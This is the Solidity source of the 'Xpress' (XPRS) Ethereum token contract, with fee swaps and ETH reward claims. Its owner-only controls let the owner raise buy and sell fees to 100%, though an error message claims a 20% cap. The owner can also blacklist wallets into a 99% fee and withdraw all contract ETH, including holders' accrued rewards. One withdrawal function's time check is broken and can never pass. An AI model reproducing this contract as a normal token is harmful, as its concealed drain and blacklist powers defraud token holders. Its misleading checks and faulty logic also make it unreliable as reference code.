/*
https://t.me/xprsportal
https://twitter.com/Xprs_eth
https://xprs.ai/
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract Xpress is IERC20, Ownable {
    using SafeMath for uint256;
    event manualClaimExecuted(address indexed toWallet, uint256 amount);
    event autoClaimExecuted(address indexed toWallet, uint256 amount);
    string private constant _name = 'Xpress';
    string private constant _symbol = 'XPRS';
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 100000000 * (10 ** _decimals);
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) private isBot;
    mapping (address => uint256) private _refBlockNumber;
    mapping (address => uint256) private _totalClaims;
    mapping (uint256 => uint256) private _totalRewards;
    uint256 private _totalRewardsTemp = 1;
    uint256 private _lastTradeTime;
    uint256 private _contractActualBalance;
    IRouter router;
    address public pair;
    bool private tradingAllowed = false;
    bool private swapEnabled = true;
    uint256 private swapTimes;
    bool private swapping;
    uint256 swapAmount = 1;
    uint256 private swapThreshold = ( _totalSupply * 1000 ) / 100000;
    uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;
    modifier lockTheSwap {swapping = true; _; swapping = false;}
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 50;
    uint256 private rewardFee = 50;
    uint256 private burnFee = 0;
    uint256 private totalFee = 3000;
    uint256 private sellFee = 3000;
    uint256 private transferFee = 0;
    uint256 private denominator = 10000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal reward_receiver = 0x8d6d315696924d3E2EB0594346EE4A46557A6d2A;
    address internal marketing_receiver = 0x51dEE5503284E0CA9a51cE69be99b476F43a13aF;
    address internal liquidity_receiver = 0x51dEE5503284E0CA9a51cE69be99b476F43a13aF;
    address internal team_wallet = 0x89F215DA36Ee0BBF2E817eCFC488887cbdcb9d8a;
    address internal cex_wallet = 0x51058f915B5f2F8184b2760Fc5C84d6FE321fAf6;
    address internal infl_wallet = 0xb9817c35B61CE5E59F7Fb147D5c0cd3a49Ce1133;
    uint256 public _maxTxAmount = ( _totalSupply * 200 ) / 10000;
    uint256 public _maxSellAmount = ( _totalSupply * 300 ) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 300 ) / 10000;

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; pair = _pair;
        isFeeExempt[address(this)] = true;
        isFeeExempt[liquidity_receiver] = true;
        isFeeExempt[marketing_receiver] = true;
        isFeeExempt[reward_receiver] = true;
        isFeeExempt[team_wallet] = true;
        isFeeExempt[cex_wallet] = true;
        isFeeExempt[infl_wallet] = true;
        isFeeExempt[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function startTrading() external onlyOwner {tradingAllowed = true;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function shouldContractSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minTokenAmount;
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender] && recipient == pair && swapTimes >= swapAmount && aboveThreshold;
    }

    function setContractSwapSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
        swapAmount = _swapAmount; swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000));
        minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));
    }

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _reward, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; rewardFee = _reward; totalFee = _total; sellFee = _sell; transferFee = _trans;
        require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "totalFee and sellFee cannot be more than 20%");
    }

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);
        _maxTxAmount = newTx; _maxSellAmount = newTransfer; _maxWalletToken = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function setInternalAddresses(address _marketing, address _liquidity, address _reward) external onlyOwner {
        marketing_receiver = _marketing; liquidity_receiver = _liquidity; reward_receiver = _reward;
        isFeeExempt[_marketing] = true; isFeeExempt[_liquidity] = true; isFeeExempt[_reward] = true;
    }

    function setisBot(address[] calldata addresses, bool _enabled) external onlyOwner {
        for(uint i=0; i < addresses.length; i++){
        isBot[addresses[i]] = _enabled; }
    }

    function manualSwap() external onlyOwner {
        swapAndLiquify(swapThreshold);
    }

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(reward_receiver, _amount);
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(rewardFee)).mul(2);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(tokens);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);}
        uint256 rewardAmt = unitBalance.mul(2).mul(rewardFee);
        _totalRewardsTemp = _totalRewardsTemp.add(rewardAmt);
        uint256 oldContractBalance = _contractActualBalance;
        _contractActualBalance = oldContractBalance.add(rewardAmt);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}
        if(recipient == pair){return sellFee;}
        if(sender == pair){return totalFee;}
        return transferFee;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(getTotalFee(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnFee > uint256(0) && getTotalFee(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
        return amount.sub(feeAmount);} return amount;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "tradingAllowed");}
        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= _maxSellAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");
        if(recipient == pair && !isFeeExempt[sender]){swapTimes += uint256(1);}
        if(shouldContractSwap(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
        uint256 oldBalanceSender = _balances[sender];
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
        uint256 oldBalanceRecipient = _balances[recipient];
        _balances[recipient] = _balances[recipient].add(amountReceived);
        _totalRewards[block.number] = _totalRewardsTemp;
        if(sender == pair){autoClaim(recipient, oldBalanceRecipient);}
        if(recipient == pair){autoClaim(sender, oldBalanceSender);}
        if(recipient != pair && sender != pair){autoClaim(recipient, oldBalanceRecipient);autoClaim(sender, oldBalanceSender);}
        _refBlockNumber[sender] = block.number;
        _refBlockNumber[recipient] = block.number;
        _lastTradeTime = block.timestamp;
        emit Transfer(sender, recipient, amountReceived);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function manualClaim () public {
        uint256 refBlock = _refBlockNumber[msg.sender];
        address walletAddress = msg.sender;
        uint256 walletBalance = _balances[msg.sender];
        uint256 balanceToWorkWith = _totalRewardsTemp.sub(_totalRewards[refBlock]);
        uint256 amountToClaim;
        if (balanceToWorkWith > uint256(0)) {
            amountToClaim = balanceToWorkWith.mul(walletBalance).div(_totalSupply);
        } else {
            amountToClaim = 0;
        }
        if (address(this).balance > amountToClaim && amountToClaim > uint256(0)) {
            payable(walletAddress).transfer(amountToClaim);
            _refBlockNumber[walletAddress] = block.number;
            uint256 oldClaim = _totalClaims[walletAddress];
            _totalClaims[walletAddress] = oldClaim.add(amountToClaim);
            uint256 oldContractBalance = _contractActualBalance;
            _contractActualBalance = oldContractBalance.sub(amountToClaim);
            emit manualClaimExecuted(walletAddress, amountToClaim);
        }
        _totalRewards[block.number] = _totalRewardsTemp;
    }

    function autoClaim (address walletAddress, uint256 walletBalance) private {
        uint256 refBlock = _refBlockNumber[walletAddress];
        uint256 balanceToWorkWith = _totalRewardsTemp.sub(_totalRewards[refBlock]);
        uint256 amountToClaim;
        if (balanceToWorkWith > uint256(0) && walletAddress != DEAD) {
            amountToClaim = balanceToWorkWith.mul(walletBalance).div(_totalSupply);
        } else {
            amountToClaim = 0;
        }
        if (address(this).balance > amountToClaim && amountToClaim > uint256(0)) {
            payable(walletAddress).transfer(amountToClaim);
            uint256 oldClaim = _totalClaims[walletAddress];
            _totalClaims[walletAddress] = oldClaim.add(amountToClaim);
            uint256 oldContractBalance = _contractActualBalance;
            _contractActualBalance = oldContractBalance.sub(amountToClaim);
            emit autoClaimExecuted(walletAddress, amountToClaim);
        }
    }

    function setBuyBlockNumber (address _address) external onlyOwner {
        _refBlockNumber[_address] = block.number;
        _totalRewards[block.number] = _totalRewardsTemp;
    }

    function checkRewardBalance(address walletAddress) public view returns(uint256) {
        uint256 refBlock = _refBlockNumber[walletAddress];
        uint256 walletBalance = _balances[walletAddress];
        uint256 balanceToWorkWith = _totalRewardsTemp.sub(_totalRewards[refBlock]);
        uint256 rewardBalance;
        if (walletBalance > uint256(0)) {
          rewardBalance = balanceToWorkWith.mul(walletBalance).div(_totalSupply);
        } else {
          rewardBalance = 0;
        }
        return rewardBalance;
    }

    function emergencyFixTotalRewardsTemp (uint256 amount) external onlyOwner {
        _totalRewardsTemp = amount;
    }

    function withdrawStuckEth() external onlyOwner {
        (bool success,) = address(msg.sender).call{value: address(this).balance}("");
        require(success, "failed to withdraw");
    }

    function withdrawEthAboveRewardBalance() external {
        //withdraw unneeded and unused ETH from contract balance, it does not have effect on rewardBalance
        require(address(msg.sender) == reward_receiver);
        uint256 contractBalance = address(this).balance;
        uint256 amountToSend = contractBalance.sub(_contractActualBalance);
        (bool success,) = address(msg.sender).call{value: amountToSend}("");
        require(success, "failed to withdraw");
    }

    function withdrawEthFromContractIfTokenDies() external {
        //withdraw ETH balance from contract if the token does not have trade for more than one week
        require(address(msg.sender) == reward_receiver);
        uint256 currentTime = block.timestamp;
        _lastTradeTime = block.timestamp;
        uint256 diffTime = currentTime.sub(_lastTradeTime);
        uint256 oneWeek = uint256(604800);
        require(diffTime > oneWeek);
        (bool success,) = address(msg.sender).call{value: address(this).balance}("");
        require(success, "failed to withdraw");
    }

    function getClaimsTotal (address walletAddress) public view returns(uint256) {
        return _totalClaims[walletAddress];
    }

    function getReferenceBlock (address walletAddress) public view returns(uint256) {
        return _refBlockNumber[walletAddress];
    }

    function getCurrentBlock () public view returns(uint256) {
        return block.number;
    }

    function getTotalRewardsCollected () public view returns(uint256) {
        return _totalRewardsTemp;
    }

    function getContractActualBalance () public view returns(uint256) {
        return _contractActualBalance;
    }
}
